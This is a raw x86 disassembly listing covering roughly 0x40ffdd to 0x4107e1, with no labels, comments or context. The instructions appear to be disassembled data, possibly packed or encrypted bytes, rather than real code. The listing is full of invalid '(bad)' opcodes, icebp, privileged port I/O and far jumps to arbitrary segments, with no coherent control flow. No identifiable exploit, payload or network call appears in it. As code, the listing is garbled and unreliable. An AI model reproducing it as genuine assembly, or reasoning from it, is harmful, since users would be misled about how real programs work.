  40ffdd:	adc    edx,DWORD PTR [edx-0x49e28bbe]
  40ffe3:	(bad)  
  40ffe4:	pusha  
  40ffe5:	adc    DWORD PTR [edi],esp
  40ffe7:	popa   
  40ffe8:	mov    ebp,0x980a2570
  40ffed:	and    DWORD PTR [ebx],ebx
  40ffef:	cmc    
  40fff0:	mov    DWORD PTR [edx+eax*1-0x534e2be],ebx
  40fff7:	inc    edx
  40fff8:	leave  
  40fff9:	icebp  
  40fffa:	lock pop edx
  40fffc:	lea    edi,[esi-0x12f33255]
  410002:	pop    ss
  410003:	rcr    DWORD PTR [ecx+0x7c],cl
  410006:	je     0x410035
  410008:	leave  
  410009:	imul   esi,DWORD PTR [ebp+0x8fdeca7],0xfffffff4
  410010:	xor    bh,dh
  410012:	ror    BYTE PTR [edx-0x460a9bde],0xe1
  410019:	aad    0xd9
  41001b:	xor    DWORD PTR ds:0xcbb0d642,ecx
  410021:	or     ah,BYTE PTR ds:0x480f7b66
  410027:	mov    edx,0xa75b8f8
  41002c:	jo     0x410095
  41002e:	jl     0x40ffbc
  410030:	sbb    DWORD PTR [ebp-0x7d0581fb],eax
  410036:	sahf   
  410037:	xor    al,0xed
  410039:	clc    
  41003a:	xchg   bl,ch
  41003c:	daa    
  41003d:	fmul   QWORD PTR [esi-0x48e3d463]
  410043:	ret    
  410044:	pop    esi
  410045:	mov    ecx,0x6ebb5e98
  41004a:	retf   0xf200
  41004d:	mov    ds:0xa409060c,al
  410052:	jg     0x41007f
  410054:	mov    ds:0xbd70110c,eax
  410059:	fmul   QWORD PTR [ecx+0x354fb429]
  41005f:	lahf   
  410060:	inc    ebp
  410061:	in     al,0xa2
  410063:	dec    eax
  410064:	into   
  410065:	xchg   edi,eax
  410066:	xor    dh,bh
  410068:	jo     0x410044
  41006a:	test   BYTE PTR [edi+0x4b],cl
  41006d:	sbb    DWORD PTR fs:[ebx-0x39],0xffffffd9
  410072:	xchg   al,dl
  410074:	call   0xa059:0x71f6b6eb
  41007b:	fidivr WORD PTR [esi]
  41007d:	ret    
  41007e:	lds    esp,FWORD PTR [ecx+0x2]
  410081:	mov    al,0xef
  410083:	inc    ebx
  410084:	ja     0x4100e6
  410086:	retf   0x659f
  410089:	cmp    al,0x80
  41008b:	popf   
  41008c:	in     al,0x40
  41008e:	aad    0x6a
  410090:	es (bad) 
  410092:	mov    ebp,0x22adacef
  410097:	fild   DWORD PTR [ecx+esi*2+0x5935c34f]
  41009e:	mov    ebx,0x95a3abd5
  4100a3:	loopne 0x4100a9
  4100a5:	aas    
  4100a6:	call   0x125f5a6b
  4100ab:	push   ds
  4100ac:	push   ss
  4100ad:	scas   eax,DWORD PTR es:[edi]
  4100ae:	sbb    ebx,DWORD PTR [edi]
  4100b0:	inc    edi
  4100b1:	jne    0x410111
  4100b3:	(bad)  
  4100b4:	fprem1 
  4100b6:	frstor [eax+0x28]
  4100b9:	inc    ebx
  4100ba:	je     0x41012a
  4100bc:	sub    eax,esi
  4100be:	and    ch,BYTE PTR [eax]
  4100c0:	add    DWORD PTR [ebp+0x27],0xd95c164e
  4100c7:	push   cs
  4100c8:	jo     0x41005f
  4100ca:	loop   0x4100aa
  4100cc:	jg     0x410087
  4100ce:	jp     0x4100d1
  4100d0:	xchg   ebx,eax
  4100d1:	mov    ds:0xa3c1d405,eax
  4100d6:	nop
  4100d7:	icebp  
  4100d8:	fistp  DWORD PTR [edi+ebp*2+0x7515d93b]
  4100df:	push   ss
  4100e0:	jae    0x4100e3
  4100e2:	push   ebx
  4100e3:	cmp    eax,DWORD PTR [ebp+0x3a4c5170]
  4100e9:	sub    esp,DWORD PTR [esi-0x34]
  4100ec:	cmp    eax,0x3b9ce4f8
  4100f1:	sbb    al,0x9
  4100f3:	pop    eax
  4100f4:	out    dx,al
  4100f5:	icebp  
  4100f6:	ret    
  4100f7:	lock xchg edx,eax
  4100f9:	mov    bl,0x61
  4100fb:	loop   0x410105
  4100fd:	in     al,dx
  4100fe:	call   0xfc6f:0xd28d9a5a
  410105:	mov    al,0x93
  410107:	ss xchg esi,eax
  410109:	fnstsw WORD PTR [ecx+eiz*2+0x6c919391]
  410110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410111:	ror    edx,1
  410113:	pop    es
  410114:	mov    dh,0xc6
  410116:	scas   al,BYTE PTR es:[edi]
  410117:	sbb    ebx,DWORD PTR [edx+eax*8]
  41011a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41011b:	xor    BYTE PTR [ecx],ch
  41011d:	dec    esi
  41011e:	mov    dh,0x73
  410120:	test   ch,bh
  410122:	lock mov ebx,0x588c2cd3
  410128:	inc    edx
  410129:	sub    al,BYTE PTR [esi]
  41012b:	inc    edx
  41012c:	jmp    0x4100fd
  41012e:	dec    ebp
  41012f:	or     BYTE PTR [edi+eax*2],ch
  410132:	inc    edi
  410133:	dec    esp
  410134:	test   BYTE PTR [ebp-0x34b8b842],bl
  41013a:	out    0x20,eax
  41013c:	jb     0x4100df
  41013e:	pop    edi
  41013f:	cdq    
  410140:	lock pop edx
  410142:	sahf   
  410143:	push   0xffffffb0
  410145:	ins    BYTE PTR es:[edi],dx
  410146:	scas   al,BYTE PTR es:[edi]
  410147:	hlt    
  410148:	addr16 aam 0x3d
  41014b:	adc    DWORD PTR [ebp+0x687b3f42],0xec792a86
  410155:	fist   DWORD PTR [esi+ebx*4-0x4752d1]
  41015c:	inc    eax
  41015d:	xchg   esi,eax
  41015e:	aam    0xd7
  410160:	mov    ch,0x6b
  410162:	arpl   WORD PTR [eax],ax
  410164:	cmc    
  410165:	mov    bh,0x59
  410167:	mov    dl,0xad
  410169:	(bad)
  41016c:	inc    edi
  41016d:	rol    BYTE PTR [edx+0x61],cl
  410170:	in     al,dx
  410171:	push   ss
  410172:	ds xor al,0x3b
  410175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410176:	cmp    edi,ecx
  410178:	js     0x41016c
  41017a:	dec    ecx
  41017b:	outs   dx,DWORD PTR ds:[esi]
  41017c:	and    eax,0xac8558f1
  410181:	ret    
  410182:	jo     0x41010f
  410184:	add    eax,edi
  410186:	cmp    al,0x48
  410188:	mov    edx,0xf1a865ae
  41018d:	test   DWORD PTR [edx-0x1f],edi
  410190:	pop    esi
  410191:	icebp  
  410192:	mov    ch,0x42
  410194:	sar    BYTE PTR [eax+esi*8+0x31671706],0x69
  41019c:	bound  edx,QWORD PTR [eax]
  41019e:	sub    ebx,ebx
  4101a0:	or     al,0xbc
  4101a2:	ja     0x410171
  4101a4:	add    BYTE PTR [ebp+0x480768aa],0x61
  4101ab:	mov    ds:0x72aca654,al
  4101b0:	pop    ebx
  4101b1:	xor    cl,BYTE PTR [edx-0x68]
  4101b4:	push   edx
  4101b5:	sub    DWORD PTR ds:0x75e46cf6,ebp
  4101bb:	and    ebx,ecx
  4101bd:	adc    eax,ebx
  4101bf:	rol    DWORD PTR ds:0xdd3044ac,1
  4101c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c6:	pop    ebp
  4101c7:	sbb    DWORD PTR [edi+0x2f],esp
  4101ca:	push   es
  4101cb:	sub    edi,DWORD PTR [ecx]
  4101cd:	dec    eax
  4101ce:	add    ah,dl
  4101d0:	into   
  4101d1:	je     0x410246
  4101d3:	push   esi
  4101d4:	lods   eax,DWORD PTR ds:[esi]
  4101d5:	mov    edi,0xc768e711
  4101da:	icebp  
  4101db:	ds and eax,0xa616f314
  4101e1:	retf   
  4101e2:	adc    al,0x9d
  4101e4:	hlt    
  4101e5:	mov    dh,0x38
  4101e7:	push   cs
  4101e8:	daa    
  4101e9:	inc    ecx
  4101ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101eb:	cli    
  4101ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ed:	push   ebp
  4101ee:	or     al,0xbf
  4101f0:	repz inc eax
  4101f2:	mov    cl,0xee
  4101f4:	add    edx,DWORD PTR [esi+0x1c9cf3d]
  4101fa:	call   FWORD PTR [edx+0x241e33ab]
  410200:	sub    ah,BYTE PTR [esi-0x7c]
  410203:	mov    ebp,0x73e07ee6
  410208:	js     0x410208
  41020a:	mov    dh,0x1a
  41020c:	sbb    cl,BYTE PTR [ebx+0x7c]
  41020f:	jge    0x4101f5
  410211:	popf   
  410212:	and    al,BYTE PTR [eax-0x2c]
  410215:	(bad)  
  410217:	daa    
  410218:	adc    DWORD PTR [edi],0xffffffc4
  41021b:	shl    ch,0x69
  41021e:	pusha  
  41021f:	xlat   BYTE PTR fs:[ebx]
  410221:	mov    dh,0x5c
  410223:	jle    0x41027c
  410225:	mov    BYTE PTR [edi],bh
  410227:	xlat   BYTE PTR ds:[ebx]
  410228:	inc    esp
  410229:	xchg   edi,eax
  41022a:	cld    
  41022b:	(bad)  [bp+di]
  41022e:	add    DWORD PTR [esi-0x2e],0xdf5b34f
  410235:	lds    ebx,FWORD PTR [esi+ebx*4+0x1d2fb06e]
  41023c:	mov    bl,0x88
  41023e:	shl    DWORD PTR [edx],0xec
  410241:	(bad)  
  410242:	out    dx,eax
  410243:	push   ss
  410244:	pop    ss
  410245:	xchg   edx,eax
  410246:	ja     0x4101de
  410248:	cs cmp dh,ch
  41024b:	add    edi,ebx
  41024d:	adc    al,0x3e
  41024f:	jle    0x410227
  410251:	sub    DWORD PTR [ebx+0x626cbcb8],edi
  410257:	jb     0x410226
  410259:	sar    DWORD PTR [edx+0x7d710394],0x4c
  410260:	aas    
  410261:	mov    cl,0x4e
  410263:	jmp    0xf231:0x54ea72b6
  41026a:	xchg   ebx,eax
  41026b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41026c:	mov    esp,0xbe995651
  410271:	push   0x4e
  410273:	pop    ds
  410274:	xor    DWORD PTR [edx+0x21],edx
  410277:	ret    
  410278:	and    ch,dh
  41027a:	xchg   edi,eax
  41027b:	repnz leave 
  41027d:	jno    0x4102ef
  41027f:	jecxz  0x41028e
  410281:	jae    0x410283
  410283:	sbb    BYTE PTR [edx],0xac
  410286:	fadd   st,st(4)
  410288:	sub    eax,DWORD PTR [ecx]
  41028a:	test   DWORD PTR [ebx+edx*2-0x4cf377b3],ebx
  410291:	mov    DWORD PTR [ecx+0x61547470],edx
  410297:	cs gs pop edx
  41029a:	inc    ebx
  41029b:	xchg   BYTE PTR [edi+0x21],al
  41029e:	mov    ds:0xbd141a88,eax
  4102a3:	int    0xff
  4102a5:	leave  
  4102a6:	sub    edx,DWORD PTR [ebx-0x72]
  4102a9:	ret    0x16d4
  4102ac:	into   
  4102ad:	pop    esi
  4102ae:	add    edi,esp
  4102b0:	icebp  
  4102b1:	jno    0x4102d0
  4102b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b4:	fld    TBYTE PTR [edx-0x39f96d8f]
  4102ba:	xor    eax,0x7032b2c6
  4102bf:	push   ds
  4102c0:	push   ebp
  4102c1:	aad    0xcb
  4102c3:	mov    dh,0x40
  4102c5:	jbe    0x41030e
  4102c7:	push   edx
  4102c8:	push   ss
  4102c9:	fnstenv [esi]
  4102cb:	xlat   BYTE PTR ds:[ebx]
  4102cc:	jecxz  0x4102de
  4102ce:	in     al,dx
  4102cf:	call   0xcd88:0x4be735bf
  4102d6:	je     0x4102d5
  4102d8:	xlat   BYTE PTR ds:[ebx]
  4102d9:	or     ebp,DWORD PTR [ebx-0x20e3f64b]
  4102df:	shl    DWORD PTR [ebx],1
  4102e1:	repz or al,0x2f
  4102e4:	xchg   ecx,eax
  4102e5:	sub    DWORD PTR [edx+ecx*4],eax
  4102e8:	daa    
  4102e9:	dec    eax
  4102ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102eb:	leave  
  4102ec:	dec    ebx
  4102ed:	or     dh,bl
  4102ef:	pop    ds
  4102f0:	add    ebp,DWORD PTR [eax+0x65]
  4102f3:	aam    0x6c
  4102f5:	adc    bl,ah
  4102f7:	or     al,0x2b
  4102f9:	cmp    DWORD PTR gs:[ebx+ecx*8+0x4e70f8c3],eax
  410301:	cld    
  410302:	sbb    eax,0x73b71d14
  410307:	mov    edx,DWORD PTR [edx+eiz*8]
  41030a:	or     eax,0xdb9f5822
  41030f:	pop    ss
  410310:	dec    edi
  410311:	outs   dx,BYTE PTR ds:[esi]
  410312:	call   0x743c:0xe63fa1df
  410319:	in     eax,0x7b
  41031b:	in     eax,0x75
  41031d:	sti    
  41031e:	arpl   WORD PTR [edx],bx
  410320:	push   ds
  410321:	leave  
  410322:	shl    DWORD PTR [eax+ebp*1+0x2a8270ef],cl
  410329:	mov    eax,ds:0x78e719d6
  41032e:	inc    edx
  41032f:	mov    eax,eax
  410331:	fstp   st(1)
  410333:	inc    esp
  410334:	xchg   ebx,eax
  410335:	mov    cl,BYTE PTR [edi]
  410337:	or     DWORD PTR [esi],ebp
  410339:	adc    dl,dl
  41033b:	mov    edi,0x2d388be1
  410340:	push   0x92b709f
  410345:	push   ebp
  410346:	nop
  410347:	ror    DWORD PTR [ebx+0x16004d5],0x35
  41034e:	scas   eax,DWORD PTR es:[edi]
  41034f:	(bad)  
  410350:	in     eax,0xa6
  410352:	in     al,dx
  410353:	fsub   QWORD PTR [ebp+0x65]
  410356:	loope  0x410378
  410358:	adc    DWORD PTR [edx+ecx*2-0x6463cbad],ebx
  41035f:	es call 0x219812de
  410365:	lods   al,BYTE PTR ds:[esi]
  410366:	imul   edx,DWORD PTR [ecx],0x24f89125
  41036c:	xchg   ebp,eax
  41036d:	mov    ah,0x87
  41036f:	cmp    BYTE PTR [eax],dl
  410371:	mov    bl,0x9c
  410373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410374:	test   eax,0x6704400
  410379:	adc    eax,0xc80ff53d
  41037e:	retf   0x909c
  410381:	push   0xffffffe6
  410383:	out    0x90,eax
  410385:	adc    BYTE PTR [ebp+0x47],cl
  410388:	in     al,0x38
  41038a:	xchg   ebp,eax
  41038b:	frstor [esi]
  41038d:	repz dec edx
  41038f:	pop    edi
  410390:	jecxz  0x410379
  410392:	scas   al,BYTE PTR es:[edi]
  410393:	xchg   ebp,eax
  410394:	aam    0x44
  410396:	out    0x70,al
  410398:	mov    cl,0x41
  41039a:	mov    eax,ds:0x18608f37
  41039f:	jl     0x410350
  4103a1:	jo     0x41032a
  4103a3:	(bad)  
  4103a4:	sbb    BYTE PTR [esp+ebx*1-0x60548a2e],dh
  4103ab:	jp     0x4103a1
  4103ad:	rcr    ebx,0xe1
  4103b0:	jmp    0xf0ec689a
  4103b5:	sub    al,0x2d
  4103b7:	pop    ds
  4103b8:	into   
  4103b9:	in     al,0x5a
  4103bb:	dec    ecx
  4103bc:	cmp    eax,0xbe3d9c5f
  4103c1:	push   esp
  4103c2:	adc    eax,0x76206e1c
  4103c7:	push   esi
  4103c8:	ja     0x410418
  4103ca:	adc    DWORD PTR [esp+esi*2],ebx
  4103cd:	iret   
  4103ce:	add    BYTE PTR [esp+ecx*4-0x29],ah
  4103d2:	shl    BYTE PTR [edx+0x4e5d41eb],1
  4103d8:	cmp    eax,0xbdf0b03d
  4103dd:	cmp    BYTE PTR [ecx+0x71bf7f4],bh
  4103e3:	push   esp
  4103e4:	and    bl,BYTE PTR [ebp-0x73540e95]
  4103ea:	dec    edi
  4103eb:	aam    0xac
  4103ed:	mov    al,ds:0x69094ed5
  4103f2:	hlt    
  4103f3:	mov    WORD PTR [ebx-0x6afe2d8a],fs
  4103f9:	addr16 mov ds:0xa15d,eax
  4103fd:	adc    BYTE PTR [eax],dl
  4103ff:	aam    0xb6
  410401:	mov    ebp,0x63075498
  410406:	jb     0x410470
  410408:	cmp    eax,0xf3d9fd0d
  41040d:	push   esp
  41040e:	into   
  41040f:	aaa    
  410410:	pop    ebx
  410411:	(bad)  
  410412:	dec    esi
  410413:	(bad)  
  410414:	js     0x4103ae
  410416:	(bad)  
  410417:	cmp    al,0xae
  410419:	jp     0x410492
  41041b:	or     al,0xb2
  41041d:	pop    es
  41041e:	xor    BYTE PTR [edx],al
  410420:	or     dh,bh
  410422:	(bad)  
  410423:	or     ah,dl
  410425:	mov    ebp,0x6ab6561e
  41042a:	out    dx,eax
  41042b:	(bad)  
  41042c:	mov    edx,0x5e94363b
  410431:	dec    esi
  410432:	lock mov edx,0x6ebdaeeb
  410438:	mov    ch,0x62
  41043a:	cmc    
  41043b:	bound  ebp,QWORD PTR [edi]
  41043d:	inc    esi
  41043e:	rcr    DWORD PTR [ebx],1
  410440:	cld    
  410441:	rcr    BYTE PTR [esi],1
  410443:	mov    esp,0x9db4aa31
  410448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410449:	setae  ah
  41044c:	pushf  
  41044d:	inc    ebx
  41044e:	sub    DWORD PTR [ebx+0x76],ebx
  410451:	ja     0x410415
  410453:	aaa    
  410454:	dec    eax
  410455:	adc    ch,dh
  410457:	jo     0x4104c7
  410459:	aas    
  41045a:	in     eax,0x39
  41045c:	loopne 0x41048e
  41045e:	aaa    
  41045f:	ret    0x59e
  410462:	xor    ecx,DWORD PTR [ebx+0x2abb486f]
  410468:	sbb    dh,BYTE PTR [edi-0x1d]
  41046b:	xchg   BYTE PTR [edx-0x2d6a2d73],dh
  410471:	retf   
  410472:	out    0x53,eax
  410474:	adc    edi,DWORD PTR [edi-0x428eeb6b]
  41047a:	shr    DWORD PTR [ebp-0x4959242f],1
  410480:	(bad)  
  410481:	int3   
  410482:	mov    esp,DWORD PTR [eax+0x45064dee]
  410488:	daa    
  410489:	mov    DWORD PTR [eax],ecx
  41048b:	xchg   esi,eax
  41048c:	and    eax,0xaf563d0d
  410491:	loopne 0x41046d
  410493:	ins    BYTE PTR es:[edi],dx
  410494:	jl     0x4104b7
  410496:	dec    esi
  410497:	aaa    
  410498:	sbb    eax,0x8353d671
  41049d:	dec    esp
  41049e:	fst    QWORD PTR [edi-0x36]
  4104a1:	or     BYTE PTR [esi],al
  4104a3:	in     al,dx
  4104a4:	cmc    
  4104a5:	xchg   ebp,eax
  4104a6:	lds    eax,FWORD PTR [ecx+edi*4+0x669fec5]
  4104ad:	test   eax,0xa712a6a9
  4104b2:	(bad)  
  4104b4:	mov    ds:0xf94a9c3b,eax
  4104b9:	lods   eax,DWORD PTR ds:[esi]
  4104ba:	lods   al,BYTE PTR ds:[esi]
  4104bb:	daa    
  4104bc:	cmp    dl,BYTE PTR [edi]
  4104be:	cmp    edx,DWORD PTR [ecx]
  4104c0:	jb     0x410539
  4104c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104c3:	rcl    BYTE PTR [esi-0x4b9b8497],1
  4104c9:	mov    ebx,0x1b35b72f
  4104ce:	mov    ds:0x83fcefda,eax
  4104d3:	inc    edi
  4104d4:	nop
  4104d5:	(bad)  
  4104d6:	das    
  4104d7:	pop    esi
  4104d8:	push   ebp
  4104d9:	iret   
  4104da:	adc    DWORD PTR [ebx+0x4fe4c845],esp
  4104e0:	cmp    esi,DWORD PTR [eax]
  4104e2:	jmp    FWORD PTR [ecx-0x25]
  4104e5:	fldcw  WORD PTR [eax+0x10]
  4104e8:	push   DWORD PTR [edx+0x14]
  4104eb:	lds    eax,FWORD PTR [esi-0x27]
  4104ee:	mov    DWORD PTR [ecx-0x231f5eb1],ebp
  4104f4:	fidiv  DWORD PTR fs:0x2bc90192
  4104fb:	inc    esi
  4104fc:	dec    ebp
  4104fd:	jne    0x410500
  4104ff:	and    bl,ah
  410501:	faddp  st(5),st
  410503:	inc    esi
  410504:	test   al,0x17
  410506:	push   ecx
  410507:	dec    esi
  410508:	outs   dx,BYTE PTR ds:[esi]
  410509:	mov    ds:0x7e8dbc36,al
  41050e:	mov    eax,ds:0x7a64df19
  410513:	jnp    0x4104fd
  410515:	data16 lods al,BYTE PTR ds:[esi]
  410517:	lea    ecx,[ebx-0x4e51bad9]
  41051d:	repz and al,0xa9
  410520:	mov    esi,0x8eca1d81
  410525:	and    bh,0xb0
  410528:	cld    
  410529:	adc    al,0x49
  41052b:	dec    edx
  41052c:	mov    DWORD PTR [eax],esi
  41052e:	les    edx,FWORD PTR [ebx-0x5c46aa13]
  410534:	rol    DWORD PTR [ebx+0x3a583382],1
  41053a:	sub    edx,ebx
  41053c:	xlat   BYTE PTR ds:[ebx]
  41053d:	repz inc esp
  41053f:	sbb    esp,DWORD PTR [esi+esi*4]
  410542:	sahf   
  410543:	mov    eax,0x5190cbb0
  410548:	sahf   
  410549:	(bad)  
  41054a:	stc    
  41054b:	xor    dl,BYTE PTR [ebx+edx*8-0x50]
  41054f:	mov    eax,ds:0xf0078ee5
  410554:	icebp  
  410555:	mov    dh,0xac
  410557:	sub    BYTE PTR [ebx-0x73921e29],cl
  41055d:	dec    ebx
  41055e:	mov    ah,0x46
  410560:	cmp    dh,0xe8
  410563:	mov    esp,0x72382c0c
  410568:	mov    eax,0x81dd7881
  41056d:	mov    al,0x61
  41056f:	xchg   esp,eax
  410570:	fdivr  DWORD PTR [edi-0x70eee43e]
  410576:	push   0x7b8d4c26
  41057b:	mov    DWORD PTR ds:0x5365646c,edi
  410581:	cmp    BYTE PTR [ebx+ecx*2-0x51],cl
  410585:	or     esp,0x4e23bf8c
  41058b:	test   BYTE PTR [eax+eiz*4-0x5e],ch
  41058f:	xchg   ebp,eax
  410590:	arpl   bx,si
  410592:	popf   
  410593:	aam    0x60
  410595:	mov    ebp,0xfc2570ac
  41059a:	inc    esi
  41059b:	and    ch,BYTE PTR [eax]
  41059d:	cwde   
  41059e:	loopne 0x410533
  4105a0:	icebp  
  4105a1:	xchg   edi,eax
  4105a2:	out    0xb2,al
  4105a4:	jl     0x410566
  4105a6:	aad    0x17
  4105a8:	and    BYTE PTR [esi-0x5a],cl
  4105ab:	cmp    ch,BYTE PTR [edi-0x5323ded7]
  4105b1:	add    eax,0x4613467f
  4105b6:	outs   dx,BYTE PTR ds:[esi]
  4105b7:	push   ebp
  4105b8:	(bad)  
  4105b9:	xchg   ebx,eax
  4105ba:	sub    al,0x3c
  4105bc:	pop    ebp
  4105bd:	adc    bl,BYTE PTR [ebp+edi*1+0x7e3c3c12]
  4105c4:	popf   
  4105c5:	pusha  
  4105c6:	iret   
  4105c7:	call   0x656ffa85
  4105cc:	mov    eax,0x9a1380de
  4105d1:	mov    ah,0xbd
  4105d3:	mov    BYTE PTR [eax+0x7efe3a6e],cl
  4105d9:	xchg   edi,eax
  4105da:	mov    WORD PTR [ebp+0xbb71a5],es
  4105e0:	call   0xa7a4:0x5656e71b
  4105e7:	jo     0x4105ad
  4105e9:	mov    bh,0x24
  4105eb:	lahf   
  4105ec:	cmp    BYTE PTR [edi+0x63ac9928],al
  4105f2:	retf   
  4105f3:	jmp    0x41061a
  4105f5:	push   edx
  4105f6:	xlat   BYTE PTR ds:[ebx]
  4105f7:	mov    ebx,0xb3ee3d3a
  4105fc:	pop    ebp
  4105fd:	(bad)  
  4105fe:	clc    
  4105ff:	cmc    
  410600:	push   es
  410601:	inc    esp
  410603:	pop    ebx
  410604:	outs   dx,BYTE PTR ds:[esi]
  410605:	aad    0xa4
  410607:	mov    ds:0xb19126d8,al
  41060c:	fistp  WORD PTR [ebp-0x6a2fc3ed]
  410612:	shl    DWORD PTR [edi],cl
  410614:	es loope 0x410597
  410617:	pop    ds
  410618:	adc    dh,ch
  41061a:	mov    ds,WORD PTR [edx]
  41061c:	xchg   ecx,eax
  41061d:	cmp    eax,0x16513b09
  410622:	pop    ebx
  410623:	imul   edi,DWORD PTR [edx-0x4df20c0d],0xb3f45d5b
  41062d:	fidiv  WORD PTR [esi+0x3b28db9f]
  410633:	int3   
  410634:	sbb    eax,0x7016d62a
  410639:	sub    edx,esi
  41063b:	pop    eax
  41063c:	loop   0x41063f
  41063e:	add    dl,BYTE PTR [ebx-0x3cabe74e]
  410644:	mov    es,WORD PTR [edx+ebx*4-0x6e]
  410648:	sbb    eax,0xede58f7b
  41064d:	loope  0x4105e2
  41064f:	inc    esp
  410650:	mov    ebx,DWORD PTR [eax+0x64]
  410653:	mov    dh,0x2a
  410655:	xchg   edx,eax
  410656:	aad    0xee
  410658:	add    bl,BYTE PTR [ebx+ebx*4]
  41065b:	push   0x13812ca
  410660:	xchg   DWORD PTR [eax+0x1efe6bcf],esp
  410666:	lods   al,BYTE PTR ds:[esi]
  410667:	push   ss
  410668:	and    BYTE PTR [esi],ch
  41066a:	(bad)  
  41066b:	loope  0x4106d9
  41066d:	dec    ebp
  41066e:	stos   BYTE PTR es:[edi],al
  41066f:	or     eax,0xb2dd121a
  410674:	sbb    al,0xbf
  410676:	enter  0xa2bf,0xf4
  41067a:	mov    cl,0x25
  41067c:	push   cs
  41067d:	push   edi
  41067e:	daa    
  41067f:	enter  0x6280,0x78
  410683:	jne    0x41068c
  410685:	(bad)  
  410686:	mov    ebx,0xd8db136e
  41068b:	sub    eax,0x47768118
  410690:	(bad)  
  410691:	cwde   
  410692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410693:	or     ebp,DWORD PTR [esi+0x27809058]
  410699:	pop    esp
  41069a:	push   edi
  41069b:	ins    BYTE PTR es:[edi],dx
  41069c:	clc    
  41069d:	jmp    0x46ee:0xd5e03b07
  4106a4:	and    DWORD PTR [edx+0x2abca21e],ebp
  4106aa:	add    ah,BYTE PTR [ebx]
  4106ac:	and    eax,0xadd2e16e
  4106b1:	push   0xffffffa5
  4106b3:	scas   al,BYTE PTR es:[edi]
  4106b4:	daa    
  4106b5:	dec    edx
  4106b6:	add    DWORD PTR [esi],ecx
  4106b8:	mov    cl,dh
  4106ba:	push   0x66
  4106bc:	pop    ss
  4106bd:	ja     0x4106e2
  4106bf:	mov    WORD PTR [ecx],gs
  4106c1:	mov    ch,0x7c
  4106c3:	mov    ah,0x72
  4106c5:	adc    eax,0xa352aa21
  4106ca:	pop    edi
  4106cb:	dec    esp
  4106cc:	sar    bl,cl
  4106ce:	jbe    0x410732
  4106d0:	xlat   BYTE PTR ss:[ebx]
  4106d2:	dec    esi
  4106d3:	pop    es
  4106d4:	sbb    DWORD PTR [ebp-0x5e191979],0xe828e289
  4106de:	ficomp WORD PTR [ecx+0x42eabc6b]
  4106e4:	rol    DWORD PTR [edx+0x7907bae],1
  4106ea:	ss iret 
  4106ec:	test   BYTE PTR [edi+0x14ce42a5],0x61
  4106f3:	xchg   ebx,eax
  4106f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106f5:	out    dx,al
  4106f6:	dec    edi
  4106f7:	adc    al,0xc2
  4106f9:	or     eax,0xd0ec228a
  4106fe:	xchg   ecx,eax
  4106ff:	fsub   QWORD PTR [esi-0x1811de3f]
  410705:	popa   
  410706:	dec    esp
  410707:	inc    esi
  410708:	test   al,0xc9
  41070a:	lods   eax,DWORD PTR ds:[esi]
  41070b:	stc    
  41070c:	ret    
  41070d:	fs popf 
  41070f:	dec    ebp
  410710:	js     0x4106e1
  410712:	mov    dl,0x83
  410714:	in     al,0xf7
  410716:	push   ecx
  410717:	add    DWORD PTR [ecx+0x5],ecx
  41071a:	call   0x89202deb
  41071f:	add    dl,bh
  410721:	in     al,0x91
  410723:	sub    eax,0x57143c9a
  410728:	imul   ecx,DWORD PTR [esi+0x7e5ebdde],0xd4ab0904
  410732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410733:	bound  edx,QWORD PTR [edx+ebp*8+0x7]
  410737:	imul   DWORD PTR [edx+eax*4+0x26]
  41073b:	int3   
  41073c:	test   eax,0x2af647b
  410741:	mov    ds:0x9e9d93d9,eax
  410746:	mov    al,ds:0xe44773d7
  41074b:	inc    ecx
  41074c:	jmp    0xad74:0x67655537
  410753:	jmp    0xbb11:0xabe50a17
  41075a:	jge    0x410777
  41075c:	ds pop edi
  41075e:	pop    esp
  41075f:	les    ecx,FWORD PTR ds:0x6d45d68d
  410765:	push   0x7d
  410767:	fs mov ax,0xa471
  41076c:	push   0x6c
  41076e:	retf   
  41076f:	and    eax,0x4b418ec0
  410774:	neg    DWORD PTR ds:0x696dd5e5
  41077a:	loop   0x410769
  41077c:	pop    esp
  41077d:	lods   eax,DWORD PTR ds:[esi]
  41077e:	mov    ds:0xd9c582ec,al
  410783:	rcl    dl,1
  410785:	mov    al,0x19
  410787:	add    esi,DWORD PTR [ecx]
  410789:	lds    eax,FWORD PTR [edx+0x45f4ff06]
  41078f:	lea    esi,[ebx]
  410791:	mov    bl,0x97
  410793:	push   ds
  410794:	jbe    0x4107bc
  410796:	dec    ebp
  410797:	fwait
  410798:	push   esi
  410799:	clc    
  41079a:	xor    ah,0x56
  41079d:	sub    DWORD PTR [edi-0x28],0x161eff00
  4107a4:	repnz lea eax,[ecx-0x12]
  4107a8:	jmp    0x41073a
  4107aa:	es mov al,0x24
  4107ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ae:	pop    ebp
  4107af:	shr    edi,cl
  4107b1:	fcom   QWORD PTR [ebx-0x78]
  4107b4:	xor    DWORD PTR [ebx],esi
  4107b6:	pop    eax
  4107b7:	mov    WORD PTR [edx-0x5c],ds
  4107ba:	fwait
  4107bb:	xchg   esp,eax
  4107bc:	xchg   edx,eax
  4107bd:	cmp    BYTE PTR [eax+0x70b04629],ch
  4107c3:	mov    ecx,0x3508c275
  4107c8:	int    0x52
  4107ca:	je     0x4107ed
  4107cc:	mov    eax,DWORD PTR [ebx]
  4107ce:	add    eax,0x8d9c7c6c
  4107d3:	sti    
  4107d4:	lock ja 0x410792
  4107d7:	xor    DWORD PTR [ecx],0x59c6a14c
  4107dd:	or     ebp,DWORD PTR [esi]
  4107df:	sbb    DWORD PTR [ecx],ebp
  4107e1:	fidivr DWORD PTR [ebp-0xf5a54d7]
